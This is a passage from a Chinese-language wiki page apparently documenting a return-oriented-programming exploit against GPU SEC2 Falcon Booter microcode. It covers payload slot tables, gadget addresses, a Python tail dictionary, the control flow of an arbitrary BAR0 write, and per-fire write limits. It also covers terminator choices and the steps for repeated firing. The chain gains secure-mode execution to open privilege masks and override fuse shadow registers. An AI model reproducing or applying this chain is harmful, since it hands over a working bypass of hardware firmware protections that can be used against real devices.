| `0xf78c` | `0xFF8C` | `0x0000815a` | 尾基址 |
| `0xf790` | `0xFF90` | `0x00008e18` | |
| `0xf794` | `0xFF94` | `0xc0deca7e` | 帧金丝雀 |
| `0xf798` | `0xFF98` | `0x0000815a` | |
| `0xf79c` | `0xFF9C` | `0x00000000` | |
| `0xf7a0` | `0xFFA0` | `0xc0deca7e` | 帧金丝雀 |
| `0xf7a4` | `0xFFA4` | `0x00001fbd` | elevator |
| `0xf7b0` | `0xFFB0` | `0x0000ffbc` | |
| `0xf7b8` | `0xFFB8` | `0x0000582d` | |
| `0xf7c4` | `0xFFC4` | `0xc0deca7e` | 帧金丝雀 |
| `0xf7c8` | `0xFFC8` | `0x00000cbd` | |
| `0xf7d8` | `0xFFD8` | `0x00000003` | |
| `0xf7e0` | `0xFFE0` | `0x00001fbd` | elevator |
| `0xf7f4` | `0xFFF4` | `0x00000ccb` | ACR 互斥锁释放（有争议的读法） |
| `0xf7f8` | `0xFFF8` | `0x00007f2f` | **终结符，进入 `secure_teardown`** |

出现十三个不同的非金丝雀、非操作数字：`0x4a7`、`0x7`、`0xcbd`（×2）、`0x1fbd`（×3）、`0x0`（×2）、`0x10aa`、`0x815a`（×2）、`0x8e18`、`0xffbc`、`0x582d`、`0x3`、`0xccb`、`0x7f2f`。

> [!NOTE]
> **处处逐字节相同**
>
> 该载荷在正式 `master` 和全部 12 个存档分支中相同：同样的 24 次 `PutU32` 调用、同样的偏移、同样的值，经校验和及 grep `0xc0deca7eU` 验证，在每个副本中恰好出现 5 次。在 `clanker_driver-port` 分支移植的 580、590、595 和 610 补丁集之间也逐字节相同。分支之间只有 PLM 表不同，`80` 分支只改 10 GB 卡的 CFG1 和 `targetFbBytes`。

### 7.1 控制流

链条很短。一次写入，一次干净退出。

```text
0x4d4 dma_copy_block epilogue (mpopaddret $r6)
   pops r0..r6 from DMEM 0xFF3C..0xFF54, then takes RA from 0xFF5C
        |
        v
0x0cbd   mov $r10 $r0          -> r10 = writeValue  (loaded from DMEM 0xFF54)
        |
        v
0x1fbd   mov $r11 $r10         -> r11 = writeValue
         mov $r10 $r0          -> r10 = writeAddr   (reloaded from DMEM 0xFF6C)
        |
        v
0x10aa   reg_write_indirect(r10 = address, r11 = value)
         I[0x1c100] = addr ; I[0x1c200] = value ; I[0x1c000] = 0x800000f2
        |
        v
0x815a -> 0x8e18 -> 0x1fbd -> 0xffbc -> 0x582d -> 0xcbd -> 0x1fbd -> 0xccb -> 0x7f2f
         (the 0x70-byte clean-exit tail, ending inside secure_teardown)
```

置信度：高，通过把正式载荷的槽分配对照 `0xcbd`、`0x1fbd` 和 `0x10aa` 的反汇编寄存器流追踪推导。

### 7.2 尾

干净退出尾是一个固定 `0x70` 字节（112 字节）的 gadget 块，相对于终结符槽放置。用工具 `_TAIL` 字典表达，`_TAIL_END = 0x70`：

```python
_TAIL = {0x00: 0x815a, 0x04: 0x8e18, 0x08: 0,      0x0c: 0x815a,
         0x10: 0,      0x14: 0,      0x18: 0x1fbd, 0x24: 0xffbc,
         0x2c: 0x582d, 0x38: 0,      0x3c: 0xcbd,  0x4c: 0x3,
         0x54: 0x1fbd, 0x68: 0xccb,  0x6c: 0x7f2f}
```

在正式载荷中，终结符槽基址是载荷偏移 `0xf78c`（DMEM `0xFF8C`），尾运行到 `0xf7fc`（DMEM `0xFFFC`），其最高写入 dword 位于 `0xf7f8` = 63,480，结束于 63,484：63,488 字节缓冲区内部四字节。工具在 `+0x08`、`+0x14` 和 `+0x38` 列为 `0` 的槽是金丝雀槽，在正式载荷中携带 `0xc0deca7e`。

这个尾在无驱动工具中标为 HW-PROVEN，在 `refire_chain_v6.py` 和 `refire_chain_v9.py` 之间相同，并与正式载荷完全一致。

> [!NOTE]
> **谱系，精确地说**
>
> *尾*与 `refire_chain_v6._TAIL` 逐字节相同，`p(0x1100, 0x7)` 也匹配。*头*不同：v6 把值和地址相邻地放在载荷 `0xF750`/`0xF754`，RA `0x10b9` 在 `0xF75C`；而正式把值放 `0xf754`、RA `0x00000cbd` 在 `0xf75c`、地址放 `0xf76c`、`0x1fbd` 放 `0xf774`。谱系真实存在；"逐字节同一条链"是夸大的。另外，正式载荷的两个 gadget 地址（`0x10aa` 和 `0x0ccb`）出现在补丁发布前三天的一篇社区 ROP 文章中，角色匹配。正式载荷是从社区链派生还是独立产出，仅凭工件无法定案。

### 7.3 为什么退出是干净的 {#73-why-the-exit-is-clean}

尾**穿过** `secure_teardown` 退出而不是绕过它，而且它仍让 SEC2 复位 PLM 保持 `0xff`，而不是常见的 `0x8f` 污染。机制是植入 DMEM `0x1900` 的 `0x00000007`：它经过 IMEM `0x1d3b` 的 `f100_field_save_restore`，即对寄存器 `0xf100` 位 [4:6] 的读改写，`r0 == 0` 时把字段保存到 DMEM `0x1900` 并清除它，`r0 != 0` 时从 `0x1900` 恢复。寄存器 `0xf100` 在 PL0 读出 `0xbadf5040`，因为它只在 HS teardown 上下文内可达。

> [!NOTE]
> **开放问题：`secure_teardown` 的主体真的执行了吗？**
>
> `0x7f2f` 被描述为"`secure_teardown` 内的退出 gadget，从不返回"。完整 teardown 主体（SCP 清除、64 KB DMEM 清零、GPR 清除）是否在 `exit` 前执行，还是 `0x7f2f` 落在其大部分之后，存档中任何地方都没有定论。它很重要，因为两次触发之间的完整 DMEM 清零会改变什么状态可以延续。通过 `0x7f2f` 在 `secure_teardown` 主体内相对于 SCP 清除和 DMEM 清零循环的字节偏移定案。

> [!NOTE]
> **开放问题：正式载荷中的 `0x00000ccb`**
>
> 同一调用的两种读法并存："`0xccb` 处的释放调用"，与 `0xd66` 获取配对；对比"由 authenticate 设置位 24"。另外，一条硬约束被陈述：任何 ROP 退出路径都不得经过 `regtable_rw_indexed (0x0ccb)`，因为 `0xF800` 载荷线性砸掉它索引的 DMEM `0x2383` 和 `0x8e08` 寄存器描述符表，而 2026-07-06 的隔离矩阵显示每条携带写入的 rejoin 链都死在 `0xccb`。然而正式载荷在 DMEM `0xFFF4` 植入 `0x00000ccb` 并且能工作。通过追踪正式链展开期间 DMEM `0xFFF4` 是否曾被载入 PC，或它是否是永不返回穿过的帧中的死保存槽，可以定案。这是该领域最易处理的开放项，因为载荷和反汇编都在手。

---

## 8. 每次触发的写入数

> [!NOTE]
> **正式驱动每次 Booter Load 触发恰好执行一次任意 BAR0 写入**
>
> 载荷只携带一对 `(writeAddr, writeValue)`，位于载荷偏移 `0xf76c` 和 `0xf754`。驱动为自己想碰的每个寄存器重新触发一次 Booter Load，每个寄存器最多两次尝试，并用回读验证。即每次驱动加载 4 到 8 次漏洞利用触发加一次正常启动。见 [falcon-and-booter.md](falcon-and-booter.md#125-how-many-times-the-booter-runs)。

写入次数是*尾*的属性，不是机制的属性。这就是源材料有五个不同答案的原因。

| 链 / 尾 | 每次触发写入数 | 依据 |
|---|---|---|
| 正式驱动 | **1** | 读自正式源码 |
| `refire_chain_v2.py`，完整互斥锁尾 | ≤ 2 | 硬编码 `raise ValueError("<=2 writes/fire (full mutex tail caps DMEM at stock SP)")` |
| mutexfree / `0x814e` 尾 | ≤ 4 | 最高槽 = `63392 + (N-1)*24`；N=4 得 63,464（放得下），N=5 恰好超出 `0xF800` 载荷 4 字节 |
| 压缩六写布局 | 6 | 6 × 24 B + 9 字（36 B）尾 = 从 DMEM `0xFF48` 起 180 B；牺牲 `0x27fa` WPR2 rejoin 和 `0x1d9f` 栈吞噬器 |
| 可重入设计，开发者陈述 | 6 | 4 次用于恢复 booter 检查的寄存器，2 次载荷写入，互斥锁在最后调用中释放 |

支撑算术：

- 额外写入步长：`0x18` = 24 字节，由 `0x10aa` 的 `mpopaddret $r3 0x4` 尾声设定。
- 终结符槽公式：`63348 + (N-1)*0x18`。
- 终结符落点 SP：`E = 0x800 + 63392 + shift`，一次写入给 DMEM `0xFFA0`、两次 `0xFFB8`、三次 `0xFFD0`。
- `multiwrite_then_814e` 参考：`term_slot = 63388`，SP `0xFFA0`。N = 3 次写入时 `term_slot = 63396`、`tail_shift = +8`、最高尾槽 63448（DMEM `0xFFD8`），低于 63,488 的载荷上限。
- 带 16 字（64 字节）替代尾的五段布局共 184 字节（5 × 24 B + 64 B），放不进 DMEM `0xFF48` 起的 180 字节预算。正式五段布局用 15 字（60 字节）尾：120 B + 60 B = 恰好 180 B。

> [!NOTE]
> **开放问题：mutexfree 上限真的是 4 还是 2？**
>
> 槽公式推导出 ≤ 4；v2 引擎硬编码 ≤ 2，注释是"full mutex tail caps DMEM at stock SP"。一份独立发布的 5 写 poke 布局把写入 2-5 放在 DMEM `0xFF60`、`0xFF78`、`0xFF90`、`0xFFA8`，让最后的 `0x10aa` 弹出 `0xFFC0`..`0xFFD0`，并从 `0xFFD4` 到 `0xFFFC` 运行固定 12-dword 尾，这在算术上自洽且放得下。三个数字用三个不同的尾，因此对各自的尾可能都正确，但没有来源陈述调和，5 写变体的精确尾字节也没有给出。通过为每个引擎发出的精确尾计算最高占用槽，或触发五写和六写链并回读全部写入，可以定案。

---

## 9. Rejoin 策略与终结符

不同终结符权衡 SEC2 复位 PLM、ACR 互斥锁，以及 booter 自己的启动是否完成。

| 终结符 | 之后 resetPLM | ACR 互斥锁 | `0x001180f8` 半字节 | 结果 |
|---|---|---|---|---|
| `0x8117` 裸 `exit`（`f8 02`） | `0xff` | 搁浅 | 0 | 跳过 finalize。Booter Load 报告 `0x65`，MB0 `0x31`。 |
| `0x4a7` 自旋停靠 | `0xff`（保持 HS） | 搁浅 | 不变 | 早先写 `0x8403C4 = 0xff` 的 HS 写入会保持。 |
| `mutexrel3`（`0x1c0e` + 自旋） | | 释放 | 0 | |
| `814e`，fail_code = 1 | | | `0xf` | `0x814e -> main 0x80D7`；下一次 booter 报告 `0x29`。 |
| `mutexfree` | `0xff` | 释放 | 按写入数 0 或 `0xf` | 唯一实现开放 resetPLM、释放互斥锁和干净停机的组合。上限约 4 次写入。 |
| `whole_stack_rejoin` | `0x8f` | 释放 | `0x1` | 用 `D[0xFFEC] = 1` 重建 `main` 的完整帧。唯一把 `0x001180f8` finalize 成 `0x11000000`（真实启动留下的值）的终结符。到达"RISC-V active"。 |
| 经 `0x7f2f` 的 `secure_teardown` | `0xff` **如果** `D[0x1900] = 7` | 未释放 | 从未写 | **正式。** |

在调用链更高处 rejoin 释放栈：在 `0x814e`（SP `0xFFD6`）rejoin `booter_load_wrap 0x8137` 而不是在 `0x2740`（SP `0xFF98`）rejoin `booter_load_wpr_main 0x22ba`，可节省 62 字节、约三次额外写入，而且 `0x22ba` 在 `$r10` 收到非零返回值时反正几乎不做任何事。置信度：中等，基于已验证栈布局推理，并在操作上被重复 Booter 轮次取代。

`multiwrite_then_814e` 是无驱动谱系的 HW-PROVEN 干净尾：它用设为假失败码的 `r10` 在 `0x814e` rejoin `booter_load_wrap`，使 SEC2 以干净的、load2 可恢复的方式退出 HS。尾形状：`0x1fca -> 0x1fb9 (r10 <- fail_code) -> 0x1fca -> 0x814e -> 0x8173 -> main`。写入顺序被保留，`FUSE_SS_PLM` 必须是 `writes[0]`。

两个机械载荷 bug 值得作为一类记住，因为两种情况下链"工作"了但静默丢了一次写入：把 `0xFF45` 错写成 `0xFF54`（偏移 63316，写入 1 的 `$r0` 槽）；以及在 `0xFFBC` 留下 `0x00008262`，它作为普通 `ret` 工作，因此写入 5 的操作数在 `0xFFB0`/`0xFFB4` 加载了但从未发出。

---

## 10. 容易漏掉的要求

- **冲刷 CPU 缓存。** 签名 DMA 是非一致的。没有显式冲刷，Falcon 会读到过期 RAM。无驱动工具 JIT 汇编一个 17 字节 x86-64 桩并映射为 `PROT_EXEC`；正式驱动在每次载荷重填后对签名 memdesc 和 WPR 元数据描述符都调用 `memdescFlushCpuCaches()`。
- **如果无驱动触发，要布置一张有效 radix3 页表**，否则 booter 的签名前 DMA 会以原因 `0x9` 失败。
- **每次触发前重新武装 WPR2。** 每次触发都重新划分 WPR2，否则第二次 Booter Load 会以"WPR2 already up"中止。正式驱动保存一次 `0x001fa824`/`0x001fa828`，在最多 8 次尝试前每次重写保存的对，循环后再写一次。空/INIT 编码是 LO `0x0fffffff`（无驱动工具写 `0x1FFFFE00`）、HI `0`，而 HI = 0 正是让 `kgspIsWpr2Up()` 返回 false 的原因。
- **只有复位后的第一次触发以 resetPLM `0xff` 落地。** 之后每次不 FLR 的触发都卡在 HS 状态 `0x3002`。一次引擎复位（写 0 到 `0x8403C0`）把 HS 从 `0x3000` 降到 `0x3002`，让 resetPLM 保持 `0xff`、几何经一次 modprobe 保持完好、DMACTL 重新起来，但重复触发仍然以 `0x62:0x65:2674` 失败。

---

## 11. 原语实际用来做什么

一旦存在 HS 代码执行，它只被用作**枢轴**。链条打开门控熔丝覆盖影子寄存器的权限级掩码，之后普通的 PL0 主机 BAR0 写入驱动覆盖，不再需要漏洞利用。这正是正式补丁的形状：四次漏洞利用驱动的 PLM 打开，后跟四次普通 `GPU_REG_WR32()` 调用。

产生它的设计约束在驱动存在之前就已陈述：ROP 写入和保存镜像验证所需的栈帧竞争同一 DMEM 范围 `0xFF3C`-`0xFFB8`，因此五写链和完整的 `0x37b7` 重建无法共存。陈述的解决办法是只在 ROP 中保留真正需要 HS 的写入，PLM 打开后其余在主机侧完成。

有一个测量值得指出，因为它消除了整整一类工作：**对 `0x009A0204` CFG1 的一次重型安全广播写入会传播到全部 20 个逐 FBPA `CSTATUS` 寄存器**，实测为每个活动 FBPA 上 `0x200` 到 `0x800` 的转变。HS 完全绕过 FBPA PLM；打开它们从来只为了 `0x00900204 + n*0x4000` 处的主机 PL0 逐 FBPA 写入。见 [显存几何](memory-geometry.md)。

---

## 相关页面

- [SEC2 Falcon 与 Booter Load 微码](falcon-and-booter.md)
- [权限级掩码](privilege-level-masks.md)
- [显存几何](memory-geometry.md) 和 [计算节流](compute-throttle.md)
- [驱动补丁](driver-patches.md)
- [寄存器参考](register-reference.md)
- [死路](../history/dead-ends.md) 和 [工具谱系](../history/tool-lineage.md)
- [净室与出处](../history/clean-room-and-provenance.md)
- [词汇表](../start/glossary.md)
